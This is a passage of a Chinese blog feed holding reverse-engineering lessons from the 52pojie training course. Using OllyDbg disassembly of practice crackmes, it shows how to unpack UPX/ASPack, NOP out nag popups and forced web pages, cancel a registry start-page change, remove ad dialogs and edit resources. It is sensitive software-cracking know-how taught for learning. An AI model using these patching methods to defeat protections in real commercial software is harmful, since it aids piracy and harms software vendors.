ss:[ebp+0x8]</span><br><span class="line">00401B86    8B70 F4         mov esi,dword ptr ds:[eax-0xC]</span><br></pre></td></tr></table></figure><p>传入的参数是用户名和“123456”拼接，所以密码是MD5(用户名+”123456”)。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-课前预习&quot;&gt;&lt;a href=&quot;#1-课前预习&quot; class=&quot;headerlink&quot; title=&quot;1. 课前预习&quot;&gt;&lt;/a&gt;1. 课前预习&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;熟悉OD字符串插件的使用&lt;br&gt;右键或插件-&amp;gt;中文搜索引擎-&amp;gt;智能搜索，Ctrl+F搜索字符串。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;熟悉OD如何下断点&lt;br&gt;Ctrl+G，直接搜索API下断&lt;br&gt;Ctrl+N，输入表搜索API-&amp;gt;右键-&amp;gt;在每个参考上设置断点&lt;br&gt;利用插件，ApiBreak和API断点设置工具都可以&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第二三课——去弹窗、主页锁定及DIY</title>
    <link href="http://example.com/posts/7cd35487.html"/>
    <id>http://example.com/posts/7cd35487.html</id>
    <published>2022-04-05T01:29:28.102Z</published>
    <updated>2022-04-11T05:25:57.704Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-了解Windows-API"><a href="#1-了解Windows-API" class="headerlink" title="1. 了解Windows API"></a>1. 了解Windows API</h1><p>消息框：MessageBoxA/W（Ansi[ASCII]/WideChar[Unicode]）</p><p>弹页面：</p><p>ShellExecuteA/W：open url——控制台执行</p><span id="more"></span><p>WinExec：explorer.exe url——Windows执行</p><p>CreateProcessA/W：PATH url——创建进程</p><p>注册表相关：RegCreateKeyExA/W、RegOpenKeyExA/W、RegDeleteKeyExA/W</p><p>创建线程：CreateThread</p><h1 id="2-实例一"><a href="#2-实例一" class="headerlink" title="2. 实例一"></a>2. 实例一</h1><p>简单的UPX壳，先脱壳才能查找字符串、去除弹窗。</p><p>脱壳后程序运行，出现一个弹窗，再出现弹页面。弹窗点确定后，出现主程序，不一会儿又弹出一个页面，再一会儿后又弹出一个页面。</p><p>目标：去除NAG，只剩一个主程序(课程介绍的链接不用去除)。</p><p>首先去除弹窗。弹窗关键字符串“来试试我的程序啊”。脱壳后的程序载入OD，右键-&gt;中文搜索引擎-&gt;智能搜索。双击关键字符串去到反汇编窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">004014BA    C3              retn;上个函数结束</span><br><span class="line">004014BB    56              push esi;关键字符串函数开始</span><br><span class="line">004014BC    57              push edi</span><br><span class="line">004014BD    6A 67           push 0x67</span><br><span class="line">004014BF    6A 00           push 0x0</span><br><span class="line">004014C1    FF15 3C204000   call dword ptr ds:[&lt;&amp;kernel32.#GetNamedPipeHa&gt;; kernel32.GetModuleHandleW</span><br><span class="line">004014C7    50              push eax</span><br><span class="line">004014C8    FF15 E8204000   call dword ptr ds:[&lt;&amp;user32.#445&gt;]            ; user32.LoadIconW</span><br><span class="line">004014CE    8B75 08         mov esi,dword ptr ss:[ebp+0x8]                ; dumped_.&lt;ModuleEntryPoint&gt;</span><br><span class="line">004014D1    50              push eax</span><br><span class="line">004014D2    6A 00           push 0x0</span><br><span class="line">004014D4    68 80000000     push 0x80</span><br><span class="line">004014D9    56              push esi</span><br><span class="line">004014DA    FF15 F4204000   call dword ptr ds:[&lt;&amp;user32.#577&gt;]            ; user32.SendMessageW</span><br><span class="line">004014E0    6A 00           push 0x0</span><br><span class="line">004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie</span><br><span class="line">004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊</span><br><span class="line">004014EC    56              push esi</span><br><span class="line">004014ED    FF15 EC204000   call dword ptr ds:[&lt;&amp;user32.#484&gt;]            ; user32.MessageBoxW</span><br><span class="line">004014F3    8B3D 18204000   mov edi,dword ptr ds:[&lt;&amp;kernel32.#CreateThrea&gt;; kernel32.CreateThread</span><br><span class="line">004014F9    6A 00           push 0x0</span><br><span class="line">004014FB    6A 00           push 0x0</span><br><span class="line">004014FD    6A 00           push 0x0</span><br><span class="line">004014FF    68 A0104000     push dumped_.004010A0</span><br><span class="line">00401504    6A 00           push 0x0</span><br><span class="line">00401506    6A 00           push 0x0</span><br><span class="line">00401508    FFD7            call edi</span><br><span class="line">0040150A    6A 00           push 0x0</span><br><span class="line">0040150C    6A 00           push 0x0</span><br><span class="line">0040150E    6A 00           push 0x0</span><br><span class="line">00401510    68 90124000     push dumped_.00401290</span><br><span class="line">00401515    6A 00           push 0x0</span><br><span class="line">00401517    6A 00           push 0x0</span><br><span class="line">00401519    FFD7            call edi</span><br><span class="line">0040151B    68 98214000     push dumped_.00402198                         ; 吾爱破解培训第二课实例一\r\n本程序会有一个弹窗和三次弹网页操作\r\n请把广告去除，加油！</span><br><span class="line">00401520    68 E9030000     push 0x3E9</span><br><span class="line">00401525    56              push esi</span><br><span class="line">00401526    FF15 F0204000   call dword ptr ds:[&lt;&amp;user32.#597&gt;]            ; user32.SetDlgItemTextW</span><br><span class="line">0040152C    5F              pop edi                                       ; kernel32.7C817077</span><br><span class="line">0040152D    5E              pop esi                                       ; kernel32.7C817077</span><br><span class="line">0040152E    33C0            xor eax,eax</span><br><span class="line">00401530    5D              pop ebp                                       ; kernel32.7C817077</span><br><span class="line">00401531    C3              retn;关键字符串函数结束</span><br></pre></td></tr></table></figure><p>从上面的代码可知，NAG窗口函数与主程序函数在一个父函数中，父函数中没有跳转语句，所以不能靠跳转绕过NAG，试一下nop掉NAG相关代码。</p><p>程序运行到NAG的call指令，堆栈窗口显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FCB8   002A074C  |hOwner = 002A074C (&#x27;吾爱破解培训第二课实例一&#x27;,class=&#x27;#32770&#x27;)</span><br><span class="line">0012FCBC   00402180  |Text = &quot;来试试我的程序啊&quot;</span><br><span class="line">0012FCC0   00402170  |Title = &quot;52PoJie&quot;</span><br><span class="line">0012FCC4   00000000  \Style = MB_OK|MB_APPLMODAL</span><br></pre></td></tr></table></figure><p>即运行这个函数前有4个参数压栈，也就是call前面的4个<code>push</code>指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004014E0    6A 00           push 0x0</span><br><span class="line">004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie</span><br><span class="line">004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊</span><br><span class="line">004014EC    56              push esi</span><br><span class="line">004014ED    FF15 EC204000   call dword ptr ds:[&lt;&amp;user32.#484&gt;]            ; user32.MessageBoxW</span><br></pre></td></tr></table></figure><p>重载，将这5条指令用nop填充，运行，发现NAG窗口消失了。复制到可执行文件，保存。在此程序的基础上去除页面。</p><p>3个NAG页面分别为：<a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a> 、<a href="https://www.52pojie.cn/forum-5-1.html">https://www.52pojie.cn/forum-5-1.html</a> 、<a href="http://www.52pojie.cn/forum-68-1.html">http://www.52pojie.cn/forum-68-1.html</a> 。</p><p>查找关键字符串，可看到其中一个NAG页面 <a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a> 。同样，没有跳转指令，用nop填充，操作与NAG弹窗一样。保存，载入新程序。</p><p>我们知道，弹页面用的是ShellExecuteA/W、WinExec、CreateProcessA/W几个函数。Ctrl+G搜索这些函数下断。F9运行，等待一会儿，程序断在某个函数处。Alt+F9返回，程序运行到用户领空的下一指令，看到弹出页面 <a href="https://www.52pojie.cn/forum-5-1.html">https://www.52pojie.cn/forum-5-1.html</a> ，也看到了函数调用。由于又没有跳转指令，依旧用nop。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040125C    6A 05           push 0x5</span><br><span class="line">0040125E    53              push ebx</span><br><span class="line">0040125F    FF15 10204000   call dword ptr ds:[&lt;&amp;kernel32.#WriteCons&gt;; kernel32.WinExec</span><br></pre></td></tr></table></figure><p>保存，载入新程序。</p><p>依旧那几个函数，Alt+F9返回后弹出页面 <a href="http://www.52pojie.cn/forum-68-1.html">http://www.52pojie.cn/forum-68-1.html</a> 。将刚才几个函数的断点去掉，在call指令处下断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040143B    FF15 20204000   call dword ptr ds:[&lt;&amp;kernel32.#CreatePro&gt;; kernel32.CreateProcessA</span><br></pre></td></tr></table></figure><p>F9运行，查看堆栈窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C3FEC4   00000000  |ModuleFileName = NULL</span><br><span class="line">00C3FEC8   003A4210  |CommandLine = &quot;C:\Program Files\Internet Explorer\iexplore.exe http://www.52pojie.cn/forum-68-1.html&quot;</span><br><span class="line">00C3FECC   00000000  |pProcessSecurity = NULL</span><br><span class="line">00C3FED0   00000000  |pThreadSecurity = NULL</span><br><span class="line">00C3FED4   00000000  |InheritHandles = FALSE</span><br><span class="line">00C3FED8   00000000  |CreationFlags = 0</span><br><span class="line">00C3FEDC   00000000  |pEnvironment = NULL</span><br><span class="line">00C3FEE0   00000000  |CurrentDir = NULL</span><br><span class="line">00C3FEE4   00C3FEF8  |pStartupInfo = 00C3FEF8</span><br><span class="line">00C3FEE8   00C3FF3C  \pProcessInfo = 00C3FF3C</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00401403    E8 C2090000     call &lt;jmp.&amp;msvcr100.#1492&gt;</span><br><span class="line">00401408    83C4 0C         add esp,0xC</span><br><span class="line">0040140B    8D55 88         lea edx,dword ptr ss:[ebp-0x78]</span><br><span class="line">0040140E    52              push edx</span><br><span class="line">0040140F    8D85 44FFFFFF   lea eax,dword ptr ss:[ebp-0xBC]</span><br><span class="line">00401415    50              push eax</span><br><span class="line">00401416    6A 00           push 0x0</span><br><span class="line">00401418    6A 00           push 0x0</span><br><span class="line">0040141A    6A 00           push 0x0</span><br><span class="line">0040141C    6A 00           push 0x0</span><br><span class="line">0040141E    6A 00           push 0x0</span><br><span class="line">00401420    6A 00           push 0x0</span><br><span class="line">00401422    53              push ebx</span><br><span class="line">00401423    B9 01000000     mov ecx,0x1</span><br><span class="line">00401428    6A 00           push 0x0</span><br><span class="line">0040142A    C785 70FFFFFF 0&gt;mov dword ptr ss:[ebp-0x90],0x1</span><br><span class="line">00401434    66:898D 74FFFFF&gt;mov word ptr ss:[ebp-0x8C],cx</span><br><span class="line">0040143B    FF15 20204000   call dword ptr ds:[&lt;&amp;kernel32.#CreatePro&gt;; kernel32.CreateProcessA</span><br></pre></td></tr></table></figure><p>将<code>push edx</code>及下面的指令全都nop掉，保存。至此，所有NAG都被清除。</p><h1 id="3-实例二"><a href="#3-实例二" class="headerlink" title="3. 实例二"></a>3. 实例二</h1><p>ASPack壳，用ESP定律很快到达OEP，脱壳，用FixRes重构一下资源。</p><p>运行程序，程序会将IE主页修改为 <a href="http://www.52pojie.cn/">http://www.52pojie.cn/</a> ，主程序中央内置了广告，过了一会儿桌面右下角会闪出广告。</p><p>目标：取消主页修改，去除广告。</p><p>载入OD，查找字符串看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">地址       反汇编                                    文本字符串</span><br><span class="line">0040193D   push dumped_.004034D0                     SeDebugPrivilege</span><br><span class="line">004019E2   mov [local.14],dumped_.004034F8           SOFTWARE\microsoft\Internet Explorer\Main;微软浏览器、IE浏览器</span><br><span class="line">004019EE   mov esi,dumped_.0040354C                  http://www.52pojie.cn;广告地址</span><br><span class="line">00401A15   push dumped_.00403578                     Start Page;开始页</span><br><span class="line">00401A4B   push dumped_.00403590                     Start Page</span><br><span class="line">00401A81   push dumped_.004035A8                     Default_Page_URL;默认页</span><br><span class="line">00401B4F   push dumped_.004035CC                     我就是广告\r\n来把我干掉啊\r\n加油！;右下角的广告</span><br><span class="line">00401BA9   push dumped_.004035F4                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html</span><br><span class="line">00401C4A   push dumped_.00403630                     http://www.52pojie.cn/portal.php;主程序中间的广告</span><br><span class="line">00401DA9   push dumped_.00403674                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html</span><br></pre></td></tr></table></figure><p>先去掉IE、微软的默认广告主页。双击进去，发现整个函数都是修改浏览器的主页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">004019D0  /$  55            push ebp</span><br><span class="line">004019D1  |.  8BEC          mov ebp,esp</span><br><span class="line">004019D3  |.  83EC 38       sub esp,0x38</span><br><span class="line">004019D6  |.  A1 28504000   mov eax,dword ptr ds:[0x405028]</span><br><span class="line">004019DB  |.  33C5          xor eax,ebp</span><br><span class="line">004019DD  |.  8945 F8       mov [local.2],eax</span><br><span class="line">004019E0  |.  56            push esi</span><br><span class="line">004019E1  |.  57            push edi</span><br><span class="line">004019E2  |.  C745 C8 F8344&gt;mov [local.14],dumped_.004034F8          ;  SOFTWARE\microsoft\Internet Explorer\Main</span><br><span class="line">004019E9  |.  B9 0B000000   mov ecx,0xB</span><br><span class="line">004019EE  |.  BE 4C354000   mov esi,dumped_.0040354C                 ;  http://www.52pojie.cn</span><br><span class="line">004019F3  |.  8D7D CC       lea edi,[local.13]</span><br><span class="line">004019F6  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds&gt;</span><br><span class="line">004019F8  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">004019FB  |.  50            push eax                                 ; /pHandle = NULL</span><br><span class="line">004019FC  |.  8B4D C8       mov ecx,[local.14]                       ; |</span><br><span class="line">004019FF  |.  51            push ecx                                 ; |Subkey = &quot;?粒灴粁...&quot;</span><br><span class="line">00401A00  |.  68 02000080   push 0x80000002                          ; |hKey = HKEY_LOCAL_MACHINE</span><br><span class="line">00401A05  |.  FF15 10304000 call dword ptr ds:[&lt;&amp;advapi32.#465&gt;]     ; \RegCreateKeyW</span><br><span class="line">00401A0B  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)</span><br><span class="line">00401A0D  |.  8D55 CC       lea edx,[local.13]                       ; |</span><br><span class="line">00401A10  |.  52            push edx                                 ; |Buffer = ntdll.KiFastSystemCallRet</span><br><span class="line">00401A11  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ</span><br><span class="line">00401A13  |.  6A 00         push 0x0                                 ; |Reserved = 0x0</span><br><span class="line">00401A15  |.  68 78354000   push dumped_.00403578                    ; |Start Page</span><br><span class="line">00401A1A  |.  8B45 FC       mov eax,[local.1]                        ; |</span><br><span class="line">00401A1D  |.  50            push eax                                 ; |hKey = 0x0</span><br><span class="line">00401A1E  |.  FF15 00304000 call dword ptr ds:[&lt;&amp;advapi32.#509&gt;]     ; \RegSetValueExW</span><br><span class="line">00401A24  |.  8B4D FC       mov ecx,[local.1]</span><br><span class="line">00401A27  |.  51            push ecx                                 ; /hKey = 0012FFB0</span><br><span class="line">00401A28  |.  FF15 08304000 call dword ptr ds:[&lt;&amp;advapi32.#459&gt;]     ; \RegCloseKey</span><br><span class="line">00401A2E  |.  8D55 FC       lea edx,[local.1]</span><br><span class="line">00401A31  |.  52            push edx                                 ; /pHandle = ntdll.KiFastSystemCallRet</span><br><span class="line">00401A32  |.  8B45 C8       mov eax,[local.14]                       ; |</span><br><span class="line">00401A35  |.  50            push eax                                 ; |Subkey = NULL</span><br><span class="line">00401A36  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER</span><br><span class="line">00401A3B  |.  FF15 10304000 call dword ptr ds:[&lt;&amp;advapi32.#465&gt;]     ; \RegCreateKeyW</span><br><span class="line">00401A41  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)</span><br><span class="line">00401A43  |.  8D4D CC       lea ecx,[local.13]                       ; |</span><br><span class="line">00401A46  |.  51            push ecx                                 ; |Buffer = 0012FFB0</span><br><span class="line">00401A47  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ</span><br><span class="line">00401A49  |.  6A 00         push 0x0                                 ; |Reserved = 0x0</span><br><span class="line">00401A4B  |.  68 90354000   push dumped_.00403590                    ; |Start Page</span><br><span class="line">00401A50  |.  8B55 FC       mov edx,[local.1]                        ; |</span><br><span class="line">00401A53  |.  52            push edx                                 ; |hKey = 0x7C92E4F4</span><br><span class="line">00401A54  |.  FF15 00304000 call dword ptr ds:[&lt;&amp;advapi32.#509&gt;]     ; \RegSetValueExW</span><br><span class="line">00401A5A  |.  8B45 FC       mov eax,[local.1]</span><br><span class="line">00401A5D  |.  50            push eax                                 ; /hKey = NULL</span><br><span class="line">00401A5E  |.  FF15 08304000 call dword ptr ds:[&lt;&amp;advapi32.#459&gt;]     ; \RegCloseKey</span><br><span class="line">00401A64  |.  8D4D FC       lea ecx,[local.1]</span><br><span class="line">00401A67  |.  51            push ecx                                 ; /pHandle = 0012FFB0</span><br><span class="line">00401A68  |.  8B55 C8       mov edx,[local.14]                       ; |</span><br><span class="line">00401A6B  |.  52            push edx                                 ; |Subkey = &quot;跃?&quot;</span><br><span class="line">00401A6C  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER</span><br><span class="line">00401A71  |.  FF15 10304000 call dword ptr ds:[&lt;&amp;advapi32.#465&gt;]     ; \RegCreateKeyW</span><br><span class="line">00401A77  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)</span><br><span class="line">00401A79  |.  8D45 CC       lea eax,[local.13]                       ; |</span><br><span class="line">00401A7C  |.  50            push eax                                 ; |Buffer = NULL</span><br><span class="line">00401A7D  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ</span><br><span class="line">00401A7F  |.  6A 00         push 0x0                                 ; |Reserved = 0x0</span><br><span class="line">00401A81  |.  68 A8354000   push dumped_.004035A8                    ; |Default_Page_URL</span><br><span class="line">00401A86  |.  8B4D FC       mov ecx,[local.1]                        ; |</span><br><span class="line">00401A89  |.  51            push ecx                                 ; |hKey = 0x12FFB0</span><br><span class="line">00401A8A  |.  FF15 00304000 call dword ptr ds:[&lt;&amp;advapi32.#509&gt;]     ; \RegSetValueExW</span><br><span class="line">00401A90  |.  8B55 FC       mov edx,[local.1]</span><br><span class="line">00401A93  |.  52            push edx                                 ; /hKey = 7C92E4F4</span><br><span class="line">00401A94  |.  FF15 08304000 call dword ptr ds:[&lt;&amp;advapi32.#459&gt;]     ; \RegCloseKey</span><br><span class="line">00401A9A  |.  5F            pop edi                                  ;  kernel32.7C817077</span><br><span class="line">00401A9B  |.  5E            pop esi                                  ;  kernel32.7C817077</span><br><span class="line">00401A9C  |.  8B4D F8       mov ecx,[local.2]                        ;  kernel32.7C817080</span><br><span class="line">00401A9F  |.  33CD          xor ecx,ebp</span><br><span class="line">00401AA1  |.  E8 380B0000   call dumped_.004025DE</span><br><span class="line">00401AA6  |.  8BE5          mov esp,ebp</span><br><span class="line">00401AA8  |.  5D            pop ebp                                  ;  kernel32.7C817077</span><br><span class="line">00401AA9  \.  C3            retn</span><br></pre></td></tr></table></figure><p>这时可以直接将第1行代码修改为<code>retn</code>，但必须保证这个<code>retn</code>与段尾的<code>retn</code>状态一致，否则会导致堆栈不平衡。或者运行到段尾，执行返回，将父函数nop掉。保存，载入新程序。</p><p>去除桌面右下角的广告。在CreateWindowExA/W、DialogBoxParamA/W下断运行。会自动停很多次，因为有很多窗口，但有些很明显不是，比如主程序还没出来就断下的肯定不是。主程序出来后要等一会儿才会出现右下角广告，所以需要等待一点时间才会断下。</p><p>最后找到堆栈窗口为这个时，是右下角广告。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">015FFF9C   00401BFB  /CALL 到 DialogBoxParamW 来自 dumped_1.00401BF5</span><br><span class="line">015FFFA0   00400000  |hInst = 00400000</span><br><span class="line">015FFFA4   00000084  |pTemplate = 0x84</span><br><span class="line">015FFFA8   00000000  |hOwner = NULL</span><br><span class="line">015FFFAC   00401B00  |DlgProc = dumped_1.00401B00</span><br><span class="line">015FFFB0   00000000  \lParam = NULL</span><br></pre></td></tr></table></figure><p>选中堆栈窗口的第1行，回车返回调用函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00401BD0  /.  55            push ebp</span><br><span class="line">00401BD1  |.  8BEC          mov ebp,esp</span><br><span class="line">00401BD3  |.  68 204E0000   push 0x4E20                                            ; /Timeout = 20000. ms</span><br><span class="line">00401BD8  |.  FF15 60304000 call dword ptr ds:[&lt;&amp;kernel32.#SystemTimeToFileTime_83&gt;; \Sleep</span><br><span class="line">00401BDE  |.  6A 00         push 0x0                                               ; /lParam = NULL</span><br><span class="line">00401BE0  |.  68 001B4000   push dumped_1.00401B00                                 ; |DlgProc = dumped_1.00401B00</span><br><span class="line">00401BE5  |.  6A 00         push 0x0                                               ; |hOwner = NULL</span><br><span class="line">00401BE7  |.  68 84000000   push 0x84                                              ; |pTemplate = 0x84</span><br><span class="line">00401BEC  |.  6A 00         push 0x0                                               ; |/pModule = NULL</span><br><span class="line">00401BEE  |.  FF15 1C304000 call dword ptr ds:[&lt;&amp;kernel32.#GetNamedPipeHandleState&gt;; |\GetModuleHandleW</span><br><span class="line">00401BF4  |.  50            push eax                                               ; |hInst = 00400000</span><br><span class="line">00401BF5  |.  FF15 E4304000 call dword ptr ds:[&lt;&amp;user32.#160&gt;]                     ; \DialogBoxParamW</span><br><span class="line">00401BFB  |.  5D            pop ebp                                                ;  dumped_1.00401BFB</span><br><span class="line">00401BFC  \.  C3            retn</span><br></pre></td></tr></table></figure><p>整个函数的意思是sleep20s弹出广告，那就直接在开头<code>retn</code>。保存，载入新程序。</p><p>去掉中央内置广告。查找字符串跟进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401C4A  |.  68 30364000   push dumped_1.00403630                   ;  http://www.52pojie.cn/portal.php</span><br></pre></td></tr></table></figure><p>在数据窗口跟随<code>403630</code>，用00填充 <a href="http://www.52pojie.cn/portal.php">http://www.52pojie.cn/portal.php</a> ，保存。但是主程序还是有这个框框，只是不显示页面而已。如果想要美观一点。可以用Restorator软件，将中间的框框的“可视”取消，F8提交更改，保存。</p><img src="/posts/7cd35487/%E5%8F%AF%E8%A7%86.png" class="" title="将可视取消"><h1 id="4-修改版权和资源"><a href="#4-修改版权和资源" class="headerlink" title="4. 修改版权和资源"></a>4. 修改版权和资源</h1><p>用实例二DIY。</p><h2 id="4-1-利用资源编辑器修改版权"><a href="#4-1-利用资源编辑器修改版权" class="headerlink" title="4.1 利用资源编辑器修改版权"></a>4.1 利用资源编辑器修改版权</h2><p>同样用Restorator/ResEdit/ResHacker，修改主程序的文字信息。(因为在OD看不到主程序的文字信息)</p><img src="/posts/7cd35487/Restorator%E4%BF%AE%E6%94%B9%E7%89%88%E6%9D%83.png" class="" title="Restorator修改版权"><h2 id="4-2-利用API修改版权"><a href="#4-2-利用API修改版权" class="headerlink" title="4.2 利用API修改版权"></a>4.2 利用API修改版权</h2><p>修改右下角广告的文字信息。</p><p>SetDlgItemTextA/W：DialogBox控件设置文本</p><p>在中文搜索引擎找到关键句去到反汇编窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040282F    68 181A5500     push 1_备份.00551A18                       ; 我就是广告\r\n来把我干掉啊\r\n加油！</span><br></pre></td></tr></table></figure><p>在命令窗口输入<code>d 551A18</code>定位字符串，将想要写入的文字找个网页转换成十六进制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">62 11 4e 0d 66 2f 5e 7f 54 4a ff 0c 62 11 53 ea 66 2f 5c 0f 53 ef 72 31</span><br></pre></td></tr></table></figure><p>由于PE文件是小端序的，所以将“6211”在OD里必须“1162”存放，以此类推。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 62 0d 4e 2f 66 7f 5e 4a 54 0c ff 11 62 ea 53 2f 66 0f 5c ef 53 31 72</span><br></pre></td></tr></table></figure><p>将多余的文字用00填充，写入的最好不要超过原本文字大小，以防产生各种问题。</p><img src="/posts/7cd35487/%E4%BF%AE%E6%94%B9%E6%96%87%E6%9C%AC.jpg" class="" title="修改文本"><h2 id="4-3-利用十六进制编辑器修改"><a href="#4-3-利用十六进制编辑器修改" class="headerlink" title="4.3 利用十六进制编辑器修改"></a>4.3 利用十六进制编辑器修改</h2><p>用C32asm/WinHEX修改。找到位置直接打16进制进去，目前我还没找到粘贴二进制数据的地方，所以只能手打。修改完后保存即可。</p><h1 id="5-汉化"><a href="#5-汉化" class="headerlink" title="5. 汉化"></a>5. 汉化</h1><p>在汉化时，要注意保留快捷键，比如&amp;D、&amp;F。</p><img src="/posts/7cd35487/%E6%B1%89%E5%8C%96.png" class="" 